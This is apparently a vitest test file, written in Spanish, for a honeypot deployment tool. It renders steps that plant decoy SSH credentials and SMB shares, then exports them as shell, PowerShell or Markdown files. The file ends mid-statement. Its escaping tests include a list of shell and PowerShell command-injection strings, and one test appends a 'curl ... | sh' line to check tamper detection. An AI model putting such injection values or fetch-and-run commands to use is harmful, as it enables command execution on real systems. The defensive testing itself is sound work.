import { spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { parse } from 'yaml';
import { afterEach, describe, expect, it } from 'vitest';
import {
	bloqueDeVariables,
	exportar,
	formatosDe,
	literalPowershell,
	literalSh,
	probar,
	pruebaDeVia,
	renderizar,
	sha256Pasos,
	validarHoneycosa,
	validarParametros,
	type ContextoManual,
	type Honeycosa,
	type Paso,
	type PasosGenerados
} from './index.ts';

/*
 * La vía manual (docs/diseno/modulo-despliegue.md §6.3, paso 4): renderizar,
 * probar y exportar. Los scripts exportados se ejecutan de verdad: con sh, y
 * con dash y busybox sh si están; el .ps1, con pwsh si está. Lo que no está se
 * salta y lo dice el nombre de la prueba.
 */

const ejemplo = (nombre: string) =>
	readFileSync(new URL(`./ejemplos/${nombre}`, import.meta.url), 'utf8');

function honeycosa(dato: unknown): Honeycosa {
	const r = validarHoneycosa(dato);
	if (!r.ok) throw new Error(r.errores.join('\n'));
	return r.valor;
}

type Datos = any;
const credencialDatos = (): Datos => parse(ejemplo('credencial-ssh.v2.yaml'));
const credencial = honeycosa(credencialDatos());
const smb = honeycosa(parse(ejemplo('smb.v2.yaml')));
/* Una ruta como las que propone la consola para smb.v2 (x-aleatorio). */
const RUTA_SMB = 'C:\\Datos-k3j9x2';

function congelar<T>(x: T): T {
	if (typeof x === 'object' && x !== null) {
		Object.values(x).forEach(congelar);
		Object.freeze(x);
	}
	return x;
}

const contexto = (cambios: Partial<ContextoManual> = {}): ContextoManual => ({
	trampa: { id: 'ssh-fs01', nombre: 'Credencial de fs01' },
	destino: { id: 'fs01', nombre: 'fs01', direccion: '10.20.0.9' },
	trampas: { 'cowrie-1': { direccion: '10.20.0.5', parametros: { puertoSsh: 2222 } } },
	generado: '2026-10-17T10:00:00.000Z',
	...cambios
});

const deCredencial = (cambios: Record<string, unknown> = {}) => {
	const r = validarParametros(credencial.parametros, {
		objetivo: 'cowrie-1',
		usuario: 'svc_sql4k7',
		sesion: 'nas42',
		...cambios
	});
	if (!r.ok) throw new Error(r.errores.join('\n'));
	return r.valor;
};

function generar(
	h: Honeycosa,
	via: string,
	parametros: Record<string, unknown>,
	c: ContextoManual = contexto()
): PasosGenerados {
	const r = renderizar(h, via, parametros, c);
	if (!r.ok) throw new Error(r.errores.join('\n'));
	return r.valor;
}

function errores(
	h: Honeycosa,
	via: string,
	parametros: Record<string, unknown>,
	c: ContextoManual = contexto()
): string[] {
	const r = renderizar(h, via, parametros, c);
	return r.ok ? [] : r.errores;
}

const texto = (b: Uint8Array) => new TextDecoder().decode(b);

/*
 * Una honeycosa de prueba con una sola vía manual@1: los parámetros v0, v1…
 * (texto, con un pattern anclado que admite cualquier cosa en una línea) y
 * los pasos que se le den.
 */
function manual(lenguaje: 'sh' | 'powershell', pasos: Paso[], cuantos = 1): Honeycosa {
	return honeycosa({
		version: 2,
		id: 'eco',
		nombre: 'Eco',
		descripcion: 'Repite lo que se le da.',
		versionModulo: '0.1.0',
		siembra: { clase: 'fichero' },
		senal: { clase: 'baliza' },
		parametros: {
			type: 'object',
			properties: Object.fromEntries(
				Array.from({ length: cuantos }, (_, i) => [
					`v${i}`,
					{ type: 'string', title: `Valor ${i}`, pattern: '^.{0,200}$' }
				])
			)
		},
		vias: [
			{
				id: 'eco',
				nombre: 'Eco a mano',
				ejecutor: 'manual@1',
				carga: { lenguaje, pasos },
				senal: { fuente: { tipo: 'rele' } },
				retirada: {
					tipo: 'manual',
					pasos: [{ texto: 'Nada que quitar.', orden: lenguaje === 'sh' ? 'true' : '$null = 0' }]
				}
			}
		]
	});
}

/*
 * Valores hostiles: comillas de todas las clases (PowerShell trata las
 * tipográficas como simples), sustituciones de órdenes de sh y de PowerShell,
 * separadores, variables, comodines, here-strings y lo que haga falta para
 * salir de un literal mal escapado. Si alguno se ejecutara, crearía PWNED.
 */
const HOSTILES = [
	"comilla ' simple",
	"''",
	"'\\''",
	'comillas " dobles',
	'$(touch PWNED)',
	'`touch PWNED`',
	'; touch PWNED',
	'| touch PWNED',
	'&& touch PWNED #',
	"'; touch PWNED; '",
	'$HOME ${HOME} $sd $env:PATH $SD_V0',
	'\\ barra al final \\',
	'%s %n %d %%',
	'* ? [a-z] ~ !',
	'tipográficas ‘ ’ ‚ ‛ “ ” „',
	'’; New-Item PWNED; ’',
	"'; New-Item PWNED; '",
	'$(New-Item PWNED)',
	"@' here '@",
	'-n',
	'',
	'ñandú 😀 中文',
	'#comentario'
];

const FIN = 'Sugardaddy: pasos hechos. Vuelve a la consola y pulsa «Ya está hecho».';

const hostiles = (lenguaje: 'sh' | 'powershell') => {
	const h = manual(
		lenguaje,
		HOSTILES.map((_, i) => ({
			texto: `Valor \${v${i}}.`,
			orden: lenguaje === 'sh' ? `printf '%s\\n' "$SD_V${i}"` : `Write-Output $sd.v${i}`
		})),
		HOSTILES.length
	);
	const p = generar(h, 'eco', Object.fromEntries(HOSTILES.map((v, i) => [`v${i}`, v])));
	const salida =
		HOSTILES.flatMap((v, i) => [`Paso ${i + 1} de ${HOSTILES.length}: Valor ${v}.`, v]).join('\n') +
		`\n${FIN}\n`;
	return { p, salida };
};

/*
 * Dos pasos: el primero falla en su orden, o su comprobación no sale bien (o
 * sí: «vale»); el segundo solo se ejecuta si el primero ha salido bien. La
 * comprobación de PowerShell escribe algo antes de su True o False: cuenta el
 * último valor.
 */
function dosPasos(lenguaje: 'sh' | 'powershell', que: 'orden' | 'comprobar' | 'vale') {
	const sh = lenguaje === 'sh';
	const esperado = que === 'vale' ? `"uno 'dos'"` : "'otro'";
	const primero: Paso =
		que === 'orden'
			? { texto: 'Primero, con ${v0}.', orden: sh ? 'false' : "Write-Error 'mal'" }
			: {
					texto: 'Primero, con ${v0}.',
					orden: sh ? 'true' : '$null = 0',
					comprobar: sh
						? `[ "$SD_V0" = ${esperado} ]`
						: `Write-Output 'ruido'\n$sd.v0 -eq ${esperado}`
				};
	const segundo: Paso = {
		texto: 'Segundo.',
		orden: sh ? "printf '%s\\n' segundo-hecho" : "Write-Output 'segundo-hecho'"
	};
	return generar(manual(lenguaje, [primero, segundo]), 'eco', { v0: "uno 'dos'" });
}

const carpetas: string[] = [];
afterEach(() => carpetas.splice(0).forEach((c) => rmSync(c, { recursive: true, force: true })));

function carpeta(): string {
	const c = mkdtempSync(join(tmpdir(), 'sd-manual-'));
	carpetas.push(c);
	return c;
}

/* Una orden del sistema, si está en el PATH. */
const hay = (orden: string) => spawnSync('sh', ['-c', `command -v ${orden}`]).status === 0;

/* Escribe el fichero en una carpeta de usar y tirar y lo ejecuta allí, con esa carpeta de HOME. */
function ejecutar(
	orden: string[],
	fichero: { nombre: string; contenido: Uint8Array },
	dir = carpeta()
) {
	const ruta = join(dir, fichero.nombre);
	writeFileSync(ruta, fichero.contenido);
	const r = spawnSync(orden[0], [...orden.slice(1), ruta], {
		cwd: dir,
		env: { ...process.env, HOME: dir },
		encoding: 'utf8',
		timeout: 60_000
	});
	return { codigo: r.status, salida: r.stdout, error: r.stderr, dir };
}

describe('renderizar', () => {
	it('credencial-ssh da pasos distintos para Windows y para Linux', () => {
		const windows = generar(credencial, 'windows', deCredencial());
		const linux = generar(credencial, 'linux', deCredencial());
		expect([windows.lenguaje, linux.lenguaje]).toEqual(['powershell', 'sh']);
		expect(windows.pasos[0].orden).toContain('HKCU:\\Software\\SimonTatham\\PuTTY\\Sessions');
		expect(linux.pasos[0].orden).toContain('$HOME/.ssh/config');
		expect(windows.retirada[0].orden).toContain('Remove-Item');
		expect(linux.retirada[0].orden).toContain('awk');
		expect(windows.pasos[0].texto).toBe(
			'Guarda en el perfil del usuario una sesión de PuTTY «nas42» hacia 10.20.0.5.'
		);
		expect(linux.pasos[0].texto).toBe(
			'Guarda en ~/.ssh/config del usuario una conexión «nas42» hacia 10.20.0.5.'
		);
		expect(windows.sha256).not.toBe(linux.sha256);
		/* Los mismos datos, porque las dos vías siembran lo mismo. */
		expect(windows.variables).toEqual(linux.variables);
		expect([windows.via, linux.via]).toEqual(['windows', 'linux']);
		expect(windows.nombres).toEqual({
			trampa: 'Credencial de fs01',
			destino: 'fs01',
			via: 'Pasos para Windows',
			modulo: 'Credencial SSH sembrada'
		});
	});

	it('en los textos van los valores; en las órdenes y comprobaciones, nunca', () => {
		const p = generar(credencial, 'linux', deCredencial({ sesion: 'bastion07' }));
		expect(p.variables).toEqual({
			destino_nombre: 'fs01',
			objetivo_direccion: '10.20.0.5',
			objetivo_puertoSsh: '2222',
			sesion: 'bastion07',
			usuario: 'svc_sql4k7'
		});
		expect(p.pasos[0].texto).toContain('«bastion07»');
		expect(p.retirada[0].texto).toBe('Borra la conexión «bastion07» de ~/.ssh/config.');
		for (const x of [...p.pasos, ...p.retirada, ...p.prueba!.pasos])
			for (const codigo of [x.orden, x.comprobar])
				if (codigo !== undefined) {
					expect(codigo).not.toMatch(/bastion07|svc_sql4k7|10\.20\.0\.5|2222/);
					expect(codigo).not.toContain('${');
				}
		expect(p.pasos[0].orden).toContain('"$SD_SESION"');
	});

	it('el bloque lleva lo que usan los pasos, la prueba y la marca, y nada más', () => {
		/* objetivo (el id de la Cowrie) no lo usa ningún paso: no va. */
		const p = generar(credencial, 'windows', deCredencial());
		expect(Object.keys(p.variables)).toEqual([
			'destino_nombre',
			'objetivo_direccion',
			'objetivo_puertoSsh',
			'sesion',
			'usuario'
		]);
		expect(p.marca).toEqual({ campo: 'origen.usuario', igual: 'svc_sql4k7' });
	});

	it('la prueba se guarda como la escribió el módulo, con su ventana', () => {
		const p = generar(credencial, 'windows', deCredencial());
		expect(p.prueba).toEqual({
			pasos: [
				{
					n: 1,
					texto: 'Comprueba que ${destino.nombre} llega a ${objetivo.direccion}.',
					comprobar:
						'Test-NetConnection -ComputerName $sd.objetivo_direccion -Port ([int]$sd.objetivo_puertoSsh) -InformationLevel Quiet'
				},
				{
					n: 2,
					texto:
						'Desde ${destino.nombre}, conéctate con «${usuario}» y escribe como contraseña sdprueba${nonce}.',
					orden: 'ssh -p $($sd.objetivo_puertoSsh) "$($sd.usuario)@$($sd.objetivo_direccion)"'
				}
			],
			marca: { campo: 'detalle.password', igual: 'sdprueba${nonce}' },
			ventanaMin: 15
		});
	});

	it('smb.v2: la vía del servidor de ficheros Windows, sin marca ni prueba', () => {
		/* La ruta no tiene default: la consola la propone al azar (x-aleatorio). */
		const r = validarParametros(smb.parametros, { ruta: RUTA_SMB });
		if (!r.ok) throw new Error(r.errores.join());
		const c = contexto({
			trampa: { id: 'nominas-fs02', nombre: 'Nóminas en FS02' },
			destino: { id: 'fs02', nombre: 'FS02' }
		});
		const p = generar(smb, 'carpeta-auditada', r.valor, c);
		expect(p.variables).toEqual({ recurso: 'Nominas', ruta: RUTA_SMB });
		expect(p.pasos).toHaveLength(2);
		expect(p.pasos[0].comprobar).toContain('auditpol');
		expect(p.pasos[1].texto).toContain(RUTA_SMB);
		expect(p.marca).toBeUndefined();
		expect(p.prueba).toBeUndefined();
		/* Sin ruta no hay pasos: la crean y la borran ellos. */
		const sin = validarParametros(smb.parametros, {});
		if (!sin.ok) throw new Error(sin.errores.join());
		expect(renderizar(smb, 'carpeta-auditada', sin.valor, c).ok).toBe(false);
	});

	it('un objetivo_* sin valor se rechaza: sin trampa, sin dirección o sin ese parámetro', () => {
		const p = deCredencial();
		const { objetivo: _, ...sinObjetivo } = p;
		expect(errores(credencial, 'linux', sinObjetivo)).toEqual([
			'Trampa SSH a la que apunta: falta la trampa a la que apunta'
		]);
		expect(errores(credencial, 'linux', { ...p, objetivo: 'no-esta' })).toEqual([
			'Trampa SSH a la que apunta: la trampa no-esta no existe'
		]);
		expect(
			errores(
				credencial,
				'linux',
				p,
				contexto({ trampas: { 'cowrie-1': { parametros: { puertoSsh: 22 } } } })
			)
		).toEqual([
			'Trampa SSH a la que apunta: el destino de la trampa cowrie-1 no tiene dirección; ponla en Destinos'
		]);
		/* En sh llega como SD_OBJETIVO_PUERTOSSH: también se busca. */
		expect(
			errores(
				credencial,
				'linux',
				p,
				contexto({ trampas: { 'cowrie-1': { direccion: '10.20.0.5', parametros: {} } } })
			)
		).toEqual([
			'Trampa SSH a la que apunta: la trampa cowrie-1 no tiene el parámetro de SD_OBJETIVO_PUERTOSSH'
		]);
		expect(
			errores(
				credencial,
				'linux',
				p,
				contexto({
					trampas: { 'cowrie-1': { direccion: '10.20.0.5', parametros: { PUERTOSSH: 22 } } }
				})
			)
		).toEqual([]);
	});

	it('un valor con saltos de línea o caracteres de control se rechaza', () => {
		const de = String.fromCharCode;
		const malos = [
			'a\nb',
			'a\rb',
			'a\tb',
			'a\u0000b',
			'a\u001bb',
			'a\u007fb',
			`a${de(0x85)}b`,
			`a${de(0x2028)}b`,
			`a${de(0x2029)}b`,
			`a${de(0x202e)}b`,
			`a${de(0x2066)}b`,
			`a${de(0xd800)}b`
		];
		for (const malo of malos) {
			expect(
				errores(credencial, 'linux', { ...deCredencial(), sesion: malo }),
				JSON.stringify(malo)
			).toEqual(['Nombre de la conexión: lleva saltos de línea o caracteres de control']);
			expect(
				errores(
					credencial,
					'linux',
					deCredencial(),
					contexto({ destino: { id: 'fs01', nombre: malo, direccion: '10.20.0.9' } })
				)
			).toEqual(['Nombre del destino: lleva saltos de línea o caracteres de control']);
			expect(
				errores(
					credencial,
					'linux',
					deCredencial(),
					contexto({ trampas: { 'cowrie-1': { direccion: malo, parametros: { puertoSsh: 22 } } } })
				)
			).toEqual(['Trampa SSH a la que apunta: lleva saltos de línea o caracteres de control']);
		}
		/* Un par sustituto completo (un emoji) sí vale. */
		expect(errores(credencial, 'linux', { ...deCredencial(), sesion: 'a😀b' })).toEqual([]);
	});

	it('un parámetro que usan los pasos y falta, o que no se puede escribir como texto', () => {
		const { usuario: _, ...sinUsuario } = deCredencial();
		expect(errores(credencial, 'linux', sinUsuario)).toEqual([
			'Usuario: falta, y lo usan los pasos'
		]);
		expect(errores(credencial, 'linux', { ...deCredencial(), usuario: { a: 1 } })).toEqual([
			'Usuario: no es un texto, un número ni un sí o no'
		]);
		/* Los números y los sí o no se escriben como texto. */
		const p = generar(credencial, 'linux', { ...deCredencial(), usuario: 42, sesion: true });
		expect([p.variables.usuario, p.variables.sesion]).toEqual(['42', 'true']);
	});

	it('la dirección del destino, si la usan los pasos', () => {
		const m = credencialDatos();
		m.vias[1].carga.pasos[0].texto =
			'En ${destino.nombre} (${destino.direccion}), guarda «${sesion}».';
		const h = honeycosa(m);
		const sinDireccion = contexto({ destino: { id: 'fs01', nombre: 'fs01' } });
		expect(errores(h, 'linux', deCredencial(), sinDireccion)).toEqual([
			'Dirección del destino: fs01 no tiene dirección; ponla en Destinos'
		]);
		expect(generar(h, 'linux', deCredencial()).pasos[0].texto).toBe(
			'En fs01 (10.20.0.9), guarda «nas42».'
		);
	});

	it('la URL de la baliza, para las vías de nube que la pegan (ronda conectores-tanda1, §2.5.2)', () => {
		/* Como una de las cuatro de la tanda: los pasos pegan ${baliza_url} en el
		 * texto y la leen del bloque como $sd.baliza_url / SD_BALIZA_URL (reglas 5
		 * y 6), también en los pasos de la prueba. Sin baliza acuñada, el error
		 * dice que se acuña al darle de alta. */
		const m = credencialDatos();
		m.vias[1].carga.pasos[0].texto = 'Pega la URL ${baliza_url} en el destino de la nube.';
		m.vias[1].carga.pasos[0].orden = 'printf \'%s\\n\' "$SD_BALIZA_URL"';
		m.vias[1].comprobacion.prueba.pasos[0].texto = 'Haz un GET a ${baliza_url}: sale la imagen.';
		const h = honeycosa(m);
		expect(errores(h, 'linux', deCredencial())).toEqual([
			'URL de la baliza: falta la URL de la baliza de esta honeycosa (se acuña al darle de alta)'
		]);
		const url = 'https://nube.empresa.example/b/clave-cebo-123';
		const p = generar(h, 'linux', deCredencial(), contexto({ baliza_url: url }));
		expect(p.pasos[0].texto).toBe(`Pega la URL ${url} en el destino de la nube.`);
		expect(p.pasos[0].orden).toBe('printf \'%s\\n\' "$SD_BALIZA_URL"');
		expect(p.variables.baliza_url).toBe(url);
	});

	it('dos variables que se confundirían en el bloque se rechazan', () => {
		/* Un parámetro destino_nombre y ${destino.nombre}: las dos serían destino_nombre. */
		const m = credencialDatos();
		m.parametros.properties.destino_nombre = { type: 'string', pattern: '^[a-z]+$' };
		m.vias[1].carga.pasos[0].orden = 'echo "$SD_DESTINO_NOMBRE" "$SD_SESION"';
		const h = honeycosa(m);
		expect(errores(h, 'linux', { ...deCredencial(), destino_nombre: 'x' })).toEqual([
			'Nombre del destino: su variable destino_nombre se confunde en el bloque con destino_nombre (destino_nombre)'
		]);
		/* PowerShell no distingue mayúsculas en las claves, y sh las pone todas en mayúsculas. */
		const u = credencialDatos();
		u.parametros.properties.Usuario = { type: 'string', pattern: '^[a-z]+$' };
		u.vias[0].carga.pasos[0].orden += '\nWrite-Output $sd.Usuario';
		expect(errores(honeycosa(u), 'windows', { ...deCredencial(), Usuario: 'otro' })).toEqual([
			'Usuario: su variable Usuario se confunde en el bloque con usuario (Usuario)'
		]);
		/* Y un parámetro que se llamaría como el nonce de la prueba. */
		const n = credencialDatos();
		n.parametros.properties.nonce = { type: 'string', pattern: '^[a-z]+$' };
		n.vias[1].carga.pasos[0].texto = 'Guarda «${sesion}» con ${nonce}.';
		expect(errores(honeycosa(n), 'linux', { ...deCredencial(), nonce: 'x' })).toEqual([
			'nonce: su variable nonce se confunde con el nonce de la prueba'
		]);
	});

	it('solo una vía manual@1, también por un id de «antes»', () => {
		expect(() => renderizar(smb, 'contenedor', {}, contexto())).toThrow(/contenedor@1/);
		expect(() => renderizar(credencial, 'macos', deCredencial(), contexto())).toThrow(
			/no tiene la vía macos/
		);
		const m = credencialDatos();
		m.vias[1].antes = ['posix'];
		expect(generar(honeycosa(m), 'posix', deCredencial()).via).toBe('linux');
	});

	it('lanza si el contexto no tiene la forma que garantiza la consola', () => {
		const p = deCredencial();
		expect(() =>
			renderizar(credencial, 'linux', p, contexto({ trampa: { id: 'Mal Id', nombre: 'x' } }))
		).toThrow(/slug/);
		expect(() =>
			renderizar(credencial, 'linux', p, contexto({ destino: { id: 'fs01\n', nombre: 'x' } }))
		).toThrow(/slug/);
		expect(() =>
			renderizar(credencial, 'linux', p, contexto({ generado: '17/10/2026 10:00' }))
		).toThrow(/ISO/);
	});

	it('es pura: no muta su entrada, no comparte nada con ella y la misma entrada da lo mismo', () => {
		const h = congelar(structuredClone(credencial));
		const p = congelar(deCredencial());
		const c = congelar(contexto());
		const a = generar(h, 'windows', p, c);
		const b = generar(h, 'windows', p, c);
		expect(a).toEqual(b);
		expect(a.sha256).toBe(b.sha256);
		const objetos = (x: unknown): object[] =>
			typeof x === 'object' && x !== null ? [x, ...Object.values(x).flatMap(objetos)] : [];
		expect(objetos(a).filter((o) => Object.isFrozen(o))).toEqual([]);
	});

	it('el sha256 es el del JSON canónico: no depende del orden de las claves', () => {
		const p = generar(credencial, 'windows', deCredencial());
		expect(p.sha256).toMatch(/^[0-9a-f]{64}$/);
		expect(sha256Pasos(p)).toBe(p.sha256);
		/* jsonb guarda las claves en otro orden. */
		const alReves = (x: unknown): unknown =>
			Array.isArray(x)
				? x.map(alReves)
				: typeof x === 'object' && x !== null
					? Object.fromEntries(
							Object.entries(x)
								.reverse()
								.map(([k, v]) => [k, alReves(v)])
						)
					: x;
		expect(sha256Pasos(alReves(p) as PasosGenerados)).toBe(p.sha256);
		expect(sha256Pasos(JSON.parse(JSON.stringify(p)))).toBe(p.sha256);
		/* Cualquier cambio lo cambia. */
		const otro = generar(credencial, 'windows', deCredencial(), {
			...contexto(),
			generado: '2026-10-17T10:00:01.000Z'
		});
		expect(otro.sha256).not.toBe(p.sha256);
		for (const cambiar of [
			(x: Datos) => (x.pasos[0].texto += ' '),
			(x: Datos) => (x.variables.usuario = 'svc_sql4k8'),
			(x: Datos) => (x.retirada[0].n = 2),
			(x: Datos) => (x.prueba.ventanaMin = 16),
			(x: Datos) => (x.marca.igual = 'otro')
		]) {
			const x = structuredClone(p) as Datos;
			cambiar(x);
			expect(sha256Pasos(x)).not.toBe(p.sha256);
		}
	});
});

describe('probar', () => {
	it('pone las variables guardadas y el nonce en una sola pasada', () => {
		/* Un ${nonce} que venga dentro de un valor se queda tal cual. */
		const c = contexto({ destino: { id: 'fs01', nombre: '${nonce}', direccion: '10.20.0.9' } });
		const p = generar(credencial, 'linux', deCredencial(), c);
		const prueba = probar(p, 'abcd1234');
		expect(prueba.pasos.map((x) => x.texto)).toEqual([
			'Comprueba que ${nonce} llega a 10.20.0.5.',
			'Desde ${nonce}, conéctate con la conexión «nas42» y escribe como contraseña sdpruebaabcd1234.'
		]);
		expect(prueba.marca).toEqual({ campo: 'detalle.password', igual: 'sdpruebaabcd1234' });
		expect(prueba.pasos[1].orden).toBe(p.prueba!.pasos[1].orden);
		expect(prueba.ventanaMin).toBe(15);
		/* Lo guardado no cambia. */
		expect(p.prueba!.marca).toEqual({ campo: 'detalle.password', igual: 'sdprueba${nonce}' });
	});

	it('el nonce son 8 caracteres [a-z0-9]', () => {
		const p = generar(credencial, 'linux', deCredencial());
		for (const malo of ['ABCD1234', 'abc', 'abcd12345', "abcd123'", 'abcd 123'])
			expect(() => probar(p, malo), malo).toThrow(/nonce/);
		const sinPrueba = generar(manual('sh', [{ texto: 'Uno.' }]), 'eco', {});
		expect(() => probar(sinPrueba, 'abcd1234')).toThrow(/no tienen prueba/);
	});
});

describe('pruebaDeVia', () => {
	const parametrosSmb = () => {
		const r = validarParametros(smb.parametros, {});
		if (!r.ok) throw new Error(r.errores.join('\n'));
		return r.valor;
	};
	const ctx = (direccion?: string) => ({
		trampa: { id: 'smb-1', nombre: 'Carpeta de nóminas' },
		destino: { id: 'local', nombre: 'local', ...(direccion ? { direccion } : {}) },
		trampas: {}
	});

	it('la de una vía contenedor@1, con sus parámetros, su destino y el nonce', () => {
		const r = pruebaDeVia(smb, 'contenedor', parametrosSmb(), ctx('10.40.0.5'), 'abcd1234');
		expect(r).toEqual({
			ok: true,
			valor: {
				pasos: [
					{
						n: 1,
						texto:
							'Desde otro equipo de la red, conéctate por SMB a 10.40.0.5 (puerto 445) con el usuario sdpruebaabcd1234 y cualquier contraseña.'
					}
				],
				marca: { campo: 'origen.usuario', contiene: 'sdpruebaabcd1234' },
				ventanaMin: 15,
				variables: { destino_direccion: '10.40.0.5', nonce: 'abcd1234', puertoSmb: '445' }
			}
		});
	});

	it('sin la dirección del destino, lo dice; sin prueba en la vía, null', () => {
		expect(pruebaDeVia(smb, 'contenedor', parametrosSmb(), ctx(), 'abcd1234')).toEqual({
			ok: false,
			errores: ['Dirección del destino: local no tiene dirección; ponla en Destinos']
		});
		const sinPrueba = manual('sh', [{ texto: 'Uno.' }]);
		expect(pruebaDeVia(sinPrueba, 'eco', {}, ctx(), 'abcd1234')).toBeNull();
	});

	it('una sola pasada: un ${…} dentro de un valor se queda tal cual', () => {
		const r = pruebaDeVia(smb, 'contenedor', parametrosSmb(), ctx('${nonce}'), 'abcd1234');
		expect(r?.ok && r.valor.pasos[0].texto).toMatch(/conéctate por SMB a \$\{nonce\} \(puerto/);
	});

	it('lanza con un nonce que no son 8 caracteres [a-z0-9] o con una vía que no existe', () => {
		expect(() => pruebaDeVia(smb, 'contenedor', parametrosSmb(), ctx('h'), 'ABCD1234')).toThrow(
			/nonce/
		);
		expect(() => pruebaDeVia(smb, 'otra', parametrosSmb(), ctx('h'), 'abcd1234')).toThrow(
			/no tiene la vía/
		);
	});
});

describe('exportar', () => {
	const windows = generar(credencial, 'windows', deCredencial());
	const linux = generar(credencial, 'linux', deCredencial());

	it('.ps1: UTF-8 con BOM y CRLF; .sh: UTF-8 sin BOM, LF y #!/bin/sh', () => {
		const ps1 = exportar(windows, 'ps1').contenido;
		expect([...ps1.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
		const t = texto(ps1);
		expect(t).toMatch(/\r\n$/);
		expect(t.replace(/\r\n/g, '')).not.toMatch(/[\r\n]/);
		const sh = exportar(linux, 'sh').contenido;
		expect([...sh.slice(0, 3)]).not.toEqual([0xef, 0xbb, 0xbf]);
		expect(
			texto(sh).startsWith('#!/bin/sh\nset -eu\n') || texto(sh).startsWith('#!/bin/sh\n#')
		).toBe(true);
		expect(texto(sh)).not.toContain('\r');
		expect(texto(sh)).toMatch(/\nset -eu\n/);
		/* Las tildes van en UTF-8. */
		expect(texto(sh)).toContain('conexión «nas42»');
	});

	it('la cabecera dice trampa, destino, vía, hora y el sha256 de lo guardado', () => {
		const t = texto(exportar(windows, 'ps1').contenido).replace(/^\uFEFF/, '');
		const [primera, segunda, ...resto] = t.split('\r\n');
		expect(primera).toBe(
			`# Sugardaddy · trampa ssh-fs01 · destino fs01 · vía windows · 2026-10-17T10:00:00.000Z · sha256 ${windows.sha256}`
		);
		expect(segunda).toBe(
			'# Colocar «Credencial de fs01» en fs01 · Credencial SSH sembrada 0.1.0 · Pasos para Windows'
		);
		expect(resto.slice(0, 4)).toEqual([
			'#Requires -Version 5.1',
			'Set-StrictMode -Version 3',
			"$ErrorActionPreference = 'Stop'",
			'$sd = @{'
		]);
		expect(t).toContain("  'objetivo_puertoSsh' = '2222'\r\n");
		const s = texto(exportar(linux, 'sh').contenido).split('\n');
		expect(s[1]).toBe(
			`# Sugardaddy · trampa ssh-fs01 · destino fs01 · vía linux · 2026-10-17T10:00:00.000Z · sha256 ${linux.sha256}`
		);
		expect(s).toContain("SD_OBJETIVO_PUERTOSSH='2222'");
		expect(s).toContain("SD_USUARIO='svc_sql4k7'");
	});

	it('el bloque de variables que enseña la consola es el mismo con que empieza el script', () => {
		const ps1 = texto(exportar(windows, 'ps1').contenido).replace(/\r\n/g, '\n');
		expect(bloqueDeVariables(windows)).toMatch(/^\$sd = @\{\n {2}'destino_nombre' = 'fs01'\n/);
		expect(ps1).toContain(`\n${bloqueDeVariables(windows)}\n`);
		const sh = texto(exportar(linux, 'sh').contenido);
		expect(bloqueDeVariables(linux).split('\n')).toContain("SD_USUARIO='svc_sql4k7'");
		expect(sh).toContain(`\n${bloqueDeVariables(linux)}\n`);
		/* Sin código que lo use, no hay bloque. */
		expect(bloqueDeVariables({ ...linux, lenguaje: 'ninguno' })).toBe('');
	});

	it('cada parte con su fichero: colocar, retirar y probar con su nonce', () => {
		expect(exportar(windows, 'ps1')).toMatchObject({
			nombre: 'sugardaddy-ssh-fs01-colocar.ps1',
			tipo: 'text/plain; charset=utf-8'
		});
		const retirar = exportar(linux, 'sh', { parte: 'retirar' });
		expect(retirar).toMatchObject({
			nombre: 'sugardaddy-ssh-fs01-retirar.sh',
			tipo: 'text/x-shellscript; charset=utf-8'
		});
		expect(texto(retirar.contenido)).toContain('awk -v h="Host $SD_SESION"');
		expect(texto(retirar.contenido)).not.toContain('mkdir -p');
		expect(texto(retirar.contenido)).toContain('pulsa «Ya lo he quitado»');
		const prueba = texto(exportar(linux, 'sh', { parte: 'probar', nonce: 'abcd1234' }).contenido);
		expect(prueba).toContain("SD_NONCE='abcd1234'");
		expect(prueba).toContain('escribe como contraseña sdpruebaabcd1234.');
		expect(prueba).toContain('nc -z -w 5 "$SD_OBJETIVO_DIRECCION" "$SD_OBJETIVO_PUERTOSSH"');
		expect(
			texto(exportar(windows, 'ps1', { parte: 'probar', nonce: 'abcd1234' }).contenido)
		).toContain("  'nonce' = 'abcd1234'\r\n");
		expect(exportar(linux, 'md').nombre).toBe('sugardaddy-ssh-fs01.md');
		expect(exportar(linux, 'txt').nombre).toBe('sugardaddy-ssh-fs01.txt');
	});

	it('no exporta unos pasos que no cuadran con su sha256', () => {
		const tocado = structuredClone(linux);
		tocado.pasos[0].orden += '\ncurl https://ejemplo.invalid | sh';
		expect(() => exportar(tocado, 'sh')).toThrow(/sha256/);
		expect(() => exportar(tocado, 'md')).toThrow(/sha256/);
	});

	it('un script solo en su lenguaje; el documento, siempre', () => {
		expect(formatosDe(windows)).toEqual(['ps1', 'md', 'txt']);
		expect(formatosDe(linux)).toEqual(['sh', 'md', 'txt']);
		expect(formatosDe({ lenguaje: 'ninguno' })).toEqual(['md', 'txt']);
		expect(() => exportar(linux, 'ps1')).toThrow(/sh: no se exportan como \.ps1/);
		expect(() => exportar(windows, 'sh')).toThrow(/powershell/);
	});

	it('la prueba se exporta con su nonce, y solo si la hay', () => {
		expect(() => exportar(linux, 'sh', { parte: 'probar' })).toThrow(/nonce/);
		expect(() => exportar(linux, 'sh', { parte: 'probar', nonce: 'MAL' })).toThrow(/nonce/);
		const sinPrueba = generar(manual('sh', [{ texto: 'Uno.', orden: 'true' }]), 'eco', {});
		expect(() => exportar(sinPrueba, 'sh', { parte: 'probar', nonce: 'abcd1234' })).toThrow(
			/no tienen prueba/
		);
	});

	it('el .md para la gestión de cambios: qué, dónde, cómo se comprueba y cómo se retira', () => {
		const t = texto(exportar(linux, 'md').contenido);
		expect(t.startsWith('# Pasos de «Credencial de fs01» en fs01\n')).toBe(true);
		for (const parte of [
			'- **Destino:** fs01 (`fs01`)',
			`- **sha256 de los pasos:** \`${linux.sha256}\``,
			"```sh\nSD_DESTINO_NOMBRE='fs01'",
			'## Qué se va a hacer',
			'1. Guarda en \\~/.ssh/config del usuario una conexión «nas42» hacia 10.20.0.5.',
			'   ```sh\n   mkdir -p "$HOME/.ssh"',
			'## Cómo se comprueba',
			'Comprueba que fs01 llega a 10.20.0.5.',
			'   Comprobación (tiene que terminar con código 0):',
			'contraseña sdprueba(código de la prueba).',
			'## Cómo se retira',
			'1. Borra la conexión «nas42» de \\~/.ssh/config.'
		])
			expect(t, parte).toContain(parte);
		expect(texto(exportar(linux, 'md', { nonce: 'abcd1234' }).contenido)).toContain(
